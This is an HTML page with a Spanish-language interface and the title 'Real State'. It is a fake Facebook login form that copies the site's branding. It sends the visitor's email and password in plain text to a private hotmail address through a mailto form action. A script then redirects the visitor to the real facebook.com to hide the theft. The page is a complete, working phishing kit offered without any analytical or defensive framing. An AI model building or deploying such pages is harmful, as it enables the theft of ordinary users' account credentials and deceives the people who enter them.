<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real State</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        h1 {
            position: absolute;
            top: 10px;
            left: 10px;
            color: #1877f2;
            font-size: 24px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #165dbe;
        }
    </style>
</head>
<body>

    <h1>facebook</h1>

    <div class="container">
        <form action="mailto:memoavilatorres@hotmail.com" method="post" enctype="text/plain" onsubmit="redirect()">
            <input type="email" name="email" placeholder="Correo Electrónico" required>
            <input type="tel" name="pasword" placeholder="pasword" required>
            <button type="submit">Sign In</button>
        </form>
    </div>

    <script>
        function redirect() {
            setTimeout(function() {
                window.location.href = "https://www.facebook.com";
            }, 1000);
        }
    </script>

</body>
</html>
